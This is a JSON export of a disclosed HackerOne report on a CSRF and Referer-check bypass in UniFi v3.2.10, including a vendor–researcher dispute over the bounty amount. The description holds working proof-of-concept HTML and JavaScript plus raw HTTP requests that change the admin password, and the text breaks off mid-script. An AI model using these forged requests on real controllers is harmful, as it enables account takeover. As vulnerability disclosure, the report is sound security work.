{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2015-12-08T20:31:47.360Z", 
    "voters": [
        "spam404", 
        "vraj", 
        "dyabla"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 52635, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "UniFi v3.2.10 Cross-Site Request Forgeries / Referer-Check Bypass", 
    "is_member_of_team?": null, 
    "vote_count": 3, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-01-07T20:31:47.535Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,000", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2015-06-02T18:57:51.160Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-02T18:57:51.160Z", 
            "actor": {
                "username": "ubnt-matt", 
                "url": "/ubnt-matt", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Hi,\nThank you for submitting an issue to us, and we apologize for the delay. Since launching with HackerOne we have seen many issues submitted, and we are currently working on reducing our backlog. \n\nIf you feel you have an urgent issue and has not been responded to yet, feel free to email security@ubnt.com.\n\nBest Regards,\nUbiquiti Networks", 
            "markdown_message": "<p>Hi,<br>\nThank you for submitting an issue to us, and we apologize for the delay. Since launching with HackerOne we have seen many issues submitted, and we are currently working on reducing our backlog. </p>\n\n<p>If you feel you have an urgent issue and has not been responded to yet, feel free to email <a title=\"security@ubnt.com\" href=\"mailto:security@ubnt.com\" rel=\"nofollow noopener noreferrer\">security@ubnt.com</a>.</p>\n\n<p>Best Regards,<br>\nUbiquiti Networks</p>\n", 
            "type": "Activities::Comment", 
            "id": 437513, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-03T12:20:18.545Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-03T12:20:18.545Z", 
            "actor": {
                "username": "ubnt-matt", 
                "url": "/ubnt-matt", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Hi,\n\nThank you for submitting an issue to us, and we apologize for the delay. Since launching with HackerOne we have seen many issues submitted, and we are currently working on reducing our backlog.\n\nIf you feel you have an urgent issue and has not been responded to yet, feel free to email security@ubnt.com.\n\nBest Regards,\n\nUbiquiti Networks\n", 
            "markdown_message": "<p>Hi,</p>\n\n<p>Thank you for submitting an issue to us, and we apologize for the delay. Since launching with HackerOne we have seen many issues submitted, and we are currently working on reducing our backlog.</p>\n\n<p>If you feel you have an urgent issue and has not been responded to yet, feel free to email <a title=\"security@ubnt.com\" href=\"mailto:security@ubnt.com\" rel=\"nofollow noopener noreferrer\">security@ubnt.com</a>.</p>\n\n<p>Best Regards,</p>\n\n<p>Ubiquiti Networks</p>\n", 
            "type": "Activities::Comment", 
            "id": 439032, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-09-28T14:11:10.719Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-09-28T14:11:10.719Z", 
            "actor": {
                "username": "mrtuxracer", 
                "url": "/mrtuxracer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/712/736bfd63e8af853f1440767edc5f99de2c9c5c14_medium.jpeg?1410387031"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "This report is 6 months old now. Is there any news?", 
            "markdown_message": "<p>This report is 6 months old now. Is there any news?</p>\n", 
            "type": "Activities::Comment", 
            "id": 600288, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-09-28T15:36:46.730Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-09-28T15:36:46.730Z", 
            "actor": {
                "username": "ubnt-james", 
                "url": "/ubnt-james", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Hi mrtuxracer,\n\nWould you be able to check against the latest controller version(4.7.5), and let me know?\n\nhttps://www.ubnt.com/download/unifi", 
            "markdown_message": "<p>Hi mrtuxracer,</p>\n\n<p>Would you be able to check against the latest controller version(4.7.5), and let me know?</p>\n\n<p><a title=\"https://www.ubnt.com/download/unifi\" href=\"/redirect?signature=3034a9d4a1538900ac0746378a61d9fb2f79aaf4&amp;url=https%3A%2F%2Fwww.ubnt.com%2Fdownload%2Funifi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.ubnt.com/download/unifi</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 600359, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-10-01T22:09:41.349Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-01T22:09:41.349Z", 
            "actor": {
                "username": "mrtuxracer", 
                "url": "/mrtuxracer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/712/736bfd63e8af853f1440767edc5f99de2c9c5c14_medium.jpeg?1410387031"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Looks like it has been fixed in the latest version too.", 
            "markdown_message": "<p>Looks like it has been fixed in the latest version too.</p>\n", 
            "type": "Activities::Comment", 
            "id": 605833, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-10-23T17:15:43.378Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-23T17:15:43.378Z", 
            "actor": {
                "url": "/ubnt", 
                "profile": {
                    "name": "Ubiquiti Networks"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/800/50186ca2136da762df66f3ba92606dc8b925816f_medium.png?1419364363"
                }
            }, 
            "team_handle": "ubnt", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "mrtuxracer", 
                "url": "/mrtuxracer"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 629774, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "mrtuxracer", 
                "url": "/mrtuxracer"
            }, 
            "created_at": "2015-10-23T17:15:50.930Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-10-23T17:15:50.930Z", 
            "actor": {
                "username": "ubnt-james", 
                "url": "/ubnt-james", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 629775, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-12-08T20:31:47.412Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-12-08T20:31:47.412Z", 
            "actor": {
                "username": "mrtuxracer", 
                "url": "/mrtuxracer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/712/736bfd63e8af853f1440767edc5f99de2c9c5c14_medium.jpeg?1410387031"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 713330, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-07T20:31:59.393Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-07T20:31:59.393Z", 
            "actor": {
                "url": "/ubnt", 
                "profile": {
                    "name": "Ubiquiti Networks"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/800/50186ca2136da762df66f3ba92606dc8b925816f_medium.png?1419364363"
                }
            }, 
            "team_handle": "ubnt", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 747793, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-10T18:55:44.836Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-10T18:55:44.836Z", 
            "actor": {
                "username": "mrtuxracer", 
                "url": "/mrtuxracer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/712/736bfd63e8af853f1440767edc5f99de2c9c5c14_medium.jpeg?1410387031"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Btw. Here's my writeup: https://www.rcesecurity.com/2016/02/ubiquiti-bug-bounty-unifi-v3-2-10-generic-csrf-protection-bypass", 
            "markdown_message": "<p>Btw. Here&#39;s my writeup: <a title=\"https://www.rcesecurity.com/2016/02/ubiquiti-bug-bounty-unifi-v3-2-10-generic-csrf-protection-bypass\" href=\"/redirect?signature=970b8f729b81f55d00b3b3e1eff817307c45b899&amp;url=https%3A%2F%2Fwww.rcesecurity.com%2F2016%2F02%2Fubiquiti-bug-bounty-unifi-v3-2-10-generic-csrf-protection-bypass\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.rcesecurity.com/2016/02/ubiquiti-bug-bounty-unifi-v3-2-10-generic-csrf-protection-bypass</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 833693, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-15T14:39:11.618Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-15T14:39:11.618Z", 
            "actor": {
                "username": "ubnt-james", 
                "url": "/ubnt-james", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Adding details from email.\n\nHello Ubnt-Team,\n\nI have sent multiple mails to security@ubnt.com (using PGP and without), but I haven't received any reaction, so I'll try it here.\n\nI want to report a critical security vulnerability in one of your products. To do so, I would first like to clarify a previous open case. I have included the original message below. Please forward this request to one of your security guys.\n\nThanks in advance!\n\nOriginal Message: \nAs discussed with Mary of HackerOne, I'd still like you to comment on my \nreport https://hackerone.com/reports/52635 and why it was rewarded only \nwith 500$. As Mary told me, you have promised multiple times to do so, \nbut I haven't received anything yet, so please play fair and give me a \ncomprehensive statement about this.\n\nIf I do not receive an answer until 15th April 2016, I consider that you \nare not interested in any further cooperation, and all upcoming \nvulnerabilities will be disclosed immediately based on my disclosure \npolicy (see https://www.rcesecurity.com/disclosure-policy/).\n\nThanks in advance!\n\n", 
            "markdown_message": "<p>Adding details from email.</p>\n\n<p>Hello Ubnt-Team,</p>\n\n<p>I have sent multiple mails to <a title=\"security@ubnt.com\" href=\"mailto:security@ubnt.com\" rel=\"nofollow noopener noreferrer\">security@ubnt.com</a> (using PGP and without), but I haven&#39;t received any reaction, so I&#39;ll try it here.</p>\n\n<p>I want to report a critical security vulnerability in one of your products. To do so, I would first like to clarify a previous open case. I have included the original message below. Please forward this request to one of your security guys.</p>\n\n<p>Thanks in advance!</p>\n\n<p>Original Message: <br>\nAs discussed with Mary of HackerOne, I&#39;d still like you to comment on my <br>\nreport <a title=\"https://hackerone.com/reports/52635\" href=\"https://hackerone.com/reports/52635\">https://hackerone.com/reports/52635</a> and why it was rewarded only <br>\nwith 500$. As Mary told me, you have promised multiple times to do so, <br>\nbut I haven&#39;t received anything yet, so please play fair and give me a <br>\ncomprehensive statement about this.</p>\n\n<p>If I do not receive an answer until 15th April 2016, I consider that you <br>\nare not interested in any further cooperation, and all upcoming <br>\nvulnerabilities will be disclosed immediately based on my disclosure <br>\npolicy (see <a title=\"https://www.rcesecurity.com/disclosure-policy/\" href=\"/redirect?signature=ab9ca57cbaa75a5e886574e688630a7576f41efb&amp;url=https%3A%2F%2Fwww.rcesecurity.com%2Fdisclosure-policy%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.rcesecurity.com/disclosure-policy/</span><i class=\"icon-external-link\"></i></a>).</p>\n\n<p>Thanks in advance!</p>\n", 
            "type": "Activities::Comment", 
            "id": 907950, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-15T14:44:15.601Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-15T14:44:15.601Z", 
            "actor": {
                "username": "ubnt-james", 
                "url": "/ubnt-james", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Hi there,\n\nUniFi is a controller software that is generally not available to the public Internet and all users require a username/password to access.  In addition, these requests are sent over https.\n\nIf believe that we have underpaid, could you please provide some examples as guidance?", 
            "markdown_message": "<p>Hi there,</p>\n\n<p>UniFi is a controller software that is generally not available to the public Internet and all users require a username/password to access.  In addition, these requests are sent over https.</p>\n\n<p>If believe that we have underpaid, could you please provide some examples as guidance?</p>\n", 
            "type": "Activities::Comment", 
            "id": 907954, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-15T17:09:55.743Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-15T17:09:55.743Z", 
            "actor": {
                "username": "ubnt-james", 
                "url": "/ubnt-james", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "https://support.hackerone.com/hc/en-us/articles/208475476-What-are-examples-of-bad-behavior-", 
            "markdown_message": "<p><a title=\"https://support.hackerone.com/hc/en-us/articles/208475476-What-are-examples-of-bad-behavior-\" href=\"/redirect?signature=c0d808767102015f1ea8fb00234783d7bffe2695&amp;url=https%3A%2F%2Fsupport.hackerone.com%2Fhc%2Fen-us%2Farticles%2F208475476-What-are-examples-of-bad-behavior-\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://support.hackerone.com/hc/en-us/articles/208475476-What-are-examples-of-bad-behavior-</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 908169, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-15T18:41:18.825Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-15T18:41:18.825Z", 
            "actor": {
                "username": "mrtuxracer", 
                "url": "/mrtuxracer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/712/736bfd63e8af853f1440767edc5f99de2c9c5c14_medium.jpeg?1410387031"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Hi @ubnt-james,\n\nNearly the same applies to the 18k bug, which you have paid. It is generally not available to the public and requests are served over HTTPS. In case of CSRF an external attacker could also perform this attack on internal devices, all he has to do is guessing (bruteforcing) the IP address of the UniFi installation. He does not need authentication credentials, but the user needs to be logged in. A good report to compare is https://hackerone.com/reports/44146. In addition it is a full CSRF protection bypass, which makes every single functionality vulnerable.\n\nAnd thanks for posting the link, but before you start to blame some else, start with yourself first. You're constantly ignoring my requests since I have asked for the reason on this inconsistency of payouts for the first time,  which dates back to February. I did also add H1 to the loop, you promised them to give a response, but you have never given one. I sent many mails to security@ubnt.com to get a clarification about this - there was no response. So after months trying to get a clarification from you, the only way to get you, was via your non-security support system. So tell me that this isn't a bad behavior too ?", 
            "markdown_message": "<p>Hi <a href=\"/ubnt-james\">@ubnt-james</a>,</p>\n\n<p>Nearly the same applies to the 18k bug, which you have paid. It is generally not available to the public and requests are served over HTTPS. In case of CSRF an external attacker could also perform this attack on internal devices, all he has to do is guessing (bruteforcing) the IP address of the UniFi installation. He does not need authentication credentials, but the user needs to be logged in. A good report to compare is <a title=\"https://hackerone.com/reports/44146\" href=\"https://hackerone.com/reports/44146\">https://hackerone.com/reports/44146</a>. In addition it is a full CSRF protection bypass, which makes every single functionality vulnerable.</p>\n\n<p>And thanks for posting the link, but before you start to blame some else, start with yourself first. You&#39;re constantly ignoring my requests since I have asked for the reason on this inconsistency of payouts for the first time,  which dates back to February. I did also add H1 to the loop, you promised them to give a response, but you have never given one. I sent many mails to <a title=\"security@ubnt.com\" href=\"mailto:security@ubnt.com\" rel=\"nofollow noopener noreferrer\">security@ubnt.com</a> to get a clarification about this - there was no response. So after months trying to get a clarification from you, the only way to get you, was via your non-security support system. So tell me that this isn&#39;t a bad behavior too ?</p>\n", 
            "type": "Activities::Comment", 
            "id": 908425, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-15T19:02:13.119Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-15T19:02:13.119Z", 
            "actor": {
                "username": "mrtuxracer", 
                "url": "/mrtuxracer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/712/736bfd63e8af853f1440767edc5f99de2c9c5c14_medium.jpeg?1410387031"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "To make sure: I don't want to extort anything, I just want to have a clarification on this inconsistency. But if the only way to get your attention, is utilizing the Full-Disclosure principle, then this is an absolutely legitimate way.", 
            "markdown_message": "<p>To make sure: I don&#39;t want to extort anything, I just want to have a clarification on this inconsistency. But if the only way to get your attention, is utilizing the Full-Disclosure principle, then this is an absolutely legitimate way.</p>\n", 
            "type": "Activities::Comment", 
            "id": 908469, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-13T21:34:06.380Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-13T21:34:06.380Z", 
            "actor": {
                "username": "mrtuxracer", 
                "url": "/mrtuxracer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/005/712/736bfd63e8af853f1440767edc5f99de2c9c5c14_medium.jpeg?1410387031"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Ping.", 
            "markdown_message": "<p>Ping.</p>\n", 
            "type": "Activities::Comment", 
            "id": 956809, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-05-24T18:23:45.022Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-24T18:23:45.022Z", 
            "actor": {
                "url": "/ubnt", 
                "profile": {
                    "name": "Ubiquiti Networks"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/800/50186ca2136da762df66f3ba92606dc8b925816f_medium.png?1419364363"
                }
            }, 
            "team_handle": "ubnt", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "mrtuxracer", 
                "url": "/mrtuxracer"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 981736, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "mrtuxracer", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/mrtuxracer", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/005/712/6b4e99c4403cb0b4da3713ad607daf0079379c61_small.jpeg?1410387031"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 45, 
        "name": "Cross-Site Request Forgery (CSRF)"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -91938140.59560587, 
    "disclosed_at": "2016-01-07T20:31:59.317Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/52635", 
    "created_at": "2015-03-19T17:54:18.003Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h2 id=\"vulnerability-description\">VULNERABILITY DESCRIPTION</h2>\n\n<p>The application UniFi v3.2.10 uses JSON requests to add/edit/save/delete configuration options on the administrative web-interface, but the application has an insufficient Cross-Site Request Forgery protection in place by  only checking whether the Referer Header is present and if its actual value matches the host where the system is running (default: 127.0.0.1).</p>\n\n<h2 id=\"versions-affected\">VERSIONS AFFECTED</h2>\n\n<p>UniFi v3.2.10 <br>\nolder versions may be affected too.</p>\n\n<h2 id=\"proof-of-concept-steps-to-reproduce\">PROOF-OF-CONCEPT (Steps to reproduce):</h2>\n\n<p>The following Proof-of-Concept will bypass the CSRF protection and change the password of the administrator. Basically all functionalities are vulnerable on the same way.</p>\n\n<p>Therefore a typical request to change the password of the user &quot;admin&quot; to &quot;test&quot; looks like the following when issued using the web interface:</p>\n<pre class=\"highlight plaintext\"><code>POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1\nConnection: keep-alive\nContent-Length: 163\nAccept: */*\nOrigin: https://127.0.0.1:8443\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) &gt; Chrome/39.0.2171.95 Safari/537.36\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: https://127.0.0.1:8443/manage/s/default\nAccept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\nCookie: unifises=742beba0de5c180ed18233629918a217\nHost: 127.0.0.1:8443\n\njson=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22test%22%2C%22email%22%3A%22admin%40admin.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\n</code></pre>\n<p>The following script (ubi_common_csrf.php) tries to exploit this vulnerability by changing the email address of the user &quot;admin&quot; to &quot;<a title=\"info@rcesecurity.com\" href=\"mailto:info@rcesecurity.com\" rel=\"nofollow noopener noreferrer\">info@rcesecurity.com</a>&quot; and the associated password to &quot;csrfpwd&quot;:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;form</span> <span class=\"na\">action=</span><span class=\"s\">&quot;https://127.0.0.1:8443/api/s/default/cmd/sitemgr&quot;</span> <span class=\"na\">method=</span><span class=\"s\">&quot;post&quot;</span> <span class=\"na\">enctype=</span><span class=\"s\">&quot;text/plain&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">name=</span><span class=\"s\">&quot;json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%2$\n&lt;input type=submit&gt;\n&lt;/form&gt;\n&lt;/html&gt;\n</span></code></pre>\n<p>This would lead to the following HTTP POST request with the HTTP Referer header set to e.g. <a title=\"http://www.rcesecurity.com\" href=\"/redirect?signature=3e1c40f80614f4200bac71f65b7545a8b1065bd3&amp;url=http%3A%2F%2Fwww.rcesecurity.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://www.rcesecurity.com</span><i class=\"icon-external-link\"></i></a>, where the CSRF script is placed:</p>\n<pre class=\"highlight plaintext\"><code>POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1\nConnection: keep-alive\nContent-Length: 173\nCache-Control: max-age=0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nOrigin: http://www.rcesecurity.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)    Chrome/39.0.2171.95 Safari/537.36\nContent-Type: text/plain\nReferer: http://www.rcesecurity.com/pocs/common_csrf.php\nAccept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\nCookie: unifises=742beba0de5c180ed18233629918a217\nHost: 127.0.0.1:8443\n\njson=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D==\n</code></pre>\n<p>In this case the application correctly responds with an HTTP 401 error code denying the password change:</p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 401 Unauthorized\nServer: Apache-Coyote/1.1\nContent-Type: application/json;charset=ISO-8859-1\nContent-Length: 78\nDate: Thu, 19 Mar 2015 17:24:53 GMT\n\n{ &quot;data&quot; : [ ] , &quot;meta&quot; : { &quot;msg&quot; : &quot;api.err.LoginRequired&quot; , &quot;rc&quot; : &quot;error&quot;}}\n</code></pre>\n<p>But if the HTTP Referer-Header is stripped out from the HTTP Request:</p>\n<pre class=\"highlight plaintext\"><code>POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1\nConnection: keep-alive\nContent-Length: 173\nCache-Control: max-age=0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nOrigin: http://www.rcesecurity.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36\nContent-Type: text/plain\nAccept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\nCookie: unifises=742beba0de5c180ed18233629918a217\nHost: 127.0.0.1:8443\n\njson=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D==\n</code></pre>\n<p>The application answers with an HTTP 200 code and the password was successfully changed:</p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nContent-Type: application/json;charset=ISO-8859-1\nContent-Length: 41\nDate: Thu, 19 Mar 2015 17:28:21 GMT\n\n{ &quot;data&quot; : [ ] , &quot;meta&quot; : { &quot;rc&quot; : &quot;ok&quot;}}\n</code></pre>\n<p>So all an attacker has to to is to strip out the HTTP Referer Header in a CSRF attack scenario like using the following script (ubi_passwd_change.php):</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;head&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span>\n<span class=\"kd\">function</span> <span class=\"nx\">load</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">postdata</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;&lt;form id=csrf method=POST enctype=\\&#39;text\\/plain\\&#39; action=\\&#39;https://127.0.0.1:8443/api/s/default/cmd/sitemgr\\&#39;&gt;&#39;</span> <span class=\"o\">+</span>\n                    <span class=\"s1\">&#39;&lt;input type=hidden name=\\&#39;json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\\&#39; value=\\&#39;\\&#39; /&gt;&#39;</span> <span class=\"o\">+</span>\n                    <span class=\"s1\">&#39;&lt;/form&gt;&#39;</span><span class=\"p\">;</span>\n    <span class=\"nx\">top</span><span class=\"p\">.</span><span class=\"nx\">frames</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">innerHTML</span><span class=\"o\">=</span><span class=\"nx\">postdata</span><span class=\"p\">;</span>\n    <span class=\"nx\">top</span><span class=\"p\">.</span><span class=\"nx\">frames</span><span class=\"p\">[</span><span 